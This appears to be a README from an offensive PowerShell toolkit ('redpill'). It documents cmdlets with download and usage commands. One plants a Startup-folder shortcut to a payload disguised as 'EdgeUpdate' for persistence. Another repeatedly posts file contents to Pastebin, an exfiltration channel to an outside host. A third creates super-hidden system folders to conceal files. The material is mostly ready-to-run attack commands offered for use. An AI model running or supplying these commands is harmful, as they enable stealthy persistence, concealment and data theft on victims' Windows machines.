## Out-shortcut.ps1
   
|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|[Out-shortcut](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Out-FileFormat/Out-shortcut.ps1)|Creates an shortcut file that accepts cmdline arguments to execute|User Land|[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-FileFormat/Out-Shortcut.png)|

<br />

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-FileFormat/Out-shortcut.ps1" -OutFile "Out-shortcut.ps1"
```

<br />

**execute:**
```powershell
#Create shortcut pointing to '$Env:TMP\Payload.exe' on startup folder with 'EdgeUpdate' description
.\Out-Shortcut.ps1 -shortcut "$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -target "$Env:TMP\Payload.exe" -description "EdgeUpdate"
```   

<br />

## SendToPasteBin.ps1
   
|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|[SendToPasteBin](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Out-FileFormat/SendToPasteBin.ps1)|Get filepath contents and paste it to pastebin.|User Land|[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-FileFormat/SendToPasteBin.png)|

<br />

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-FileFormat/SendToPasteBin.ps1" -OutFile "SendToPasteBin.ps1"
```

<br />

**prerequisites:**
```
-filepath 'string' only accepts .ps1 .bat .vbs file formats
-payloadurl 'string' only accepts .ps1 .bat .vbs file formats
```

<br />

**execute:**
```powershell
Get-Help .\SendToPasteBin.ps1 -full

#Get the contents of -filepath 'string' and creates a new pastebin paste from it on the sellected pastebin account.
.\SendToPasteBin.ps1 -FilePath "test.log" -maxpastes "1" -timeout "2" -PastebinUsername "r00t-3xp10it" -PastebinPassword "MyS3cr3TPassword"

#Get the contents of -filepath 'string' and creates a new pastebin paste from it each 120 seconds a max of 10 pastes on the sellected pastebin account.
.\SendToPasteBin.ps1 -FilePath "test.log" -maxpastes "10" -timeout "120" -PastebinUsername "r00t-3xp10it" -PastebinPassword "MyS3cr3TPassword"
```   

<br />

## SuperHidden.ps1
   
|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|[SuperHidden](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Out-FileFormat/SuperHidden.ps1)| Query\Create\Delete super hidden system folders|User Land|[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-FileFormat/SendToPasteBin.png)|

<br />

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-FileFormat/SuperHidden.ps1" -OutFile "SuperHidden.ps1"
```

<br />

**execute:**
```powershell
Get-Help .\SuperHidden.ps1 -full

#Search for 'Hidden, System' folders on predefined locations
.\SuperHidden.ps1 -Action Query

#Search for 'Hidden, System' folders on %TMP% location
.\SuperHidden.ps1 -Action Query -Directory $Env:TMP
   
#Search for 'Hidden, System' folders on %TMP% location 'recursive' (sub-folders)
.\SuperHidden.ps1 -Action Query -Directory $Env:TMP -Recursive true
   
#Search for folders with 'Hidden' attribute (not super Hidden, System) on %TMP%
.\SuperHidden.ps1 -Action Query -Directory $Env:TMP -attributes Hidden
   
#Search for 'Hidden, System' folders on %TMP% location with the name of 'vault'
.\SuperHidden.ps1 -Action Query -Directory $Env:TMP -FolderName vault
   
#Create\Modify 'Hidden, System' folder on %TMP% location with the name of 'vault'
.\SuperHidden.ps1 -Action Hidden -Directory $Env:TMP -FolderName vault
      
#Create\modify 'VISIBLE, System' folder on %TMP% location with the name of 'vault'
.\SuperHidden.ps1 -Action Visible -Directory $Env:TMP -FolderName vault
       
#Delete the super hidden 'Hidden, System' folder of %TMP% with the name of 'vault'
.\SuperHidden.ps1 -Action Delete -Directory $Env:TMP -FolderName vault
   
#Search for 'Hidden' OR 'System' directorys on %TMP% location in 'recursive' mode (scan sub-folders)
.\SuperHidden.ps1 -Action Query -Directory $Env:TMP -Attributes "(Hidden|System)" -Recursive true    
``` 
